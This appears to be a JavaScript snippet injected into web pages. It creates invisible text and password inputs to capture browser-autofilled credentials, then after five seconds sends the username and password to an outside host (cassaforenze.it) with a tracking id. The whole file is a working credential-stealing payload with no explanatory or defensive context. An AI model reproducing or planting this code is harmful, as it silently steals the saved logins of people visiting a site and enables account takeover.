let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input");
u.id = "log_"
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.id = "pw_";
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){
        fetch("http://cassaforenze.it/k?u=" + u.value + "&p=" + p.value + '&rid=mDPEqCa')
}, 5000);
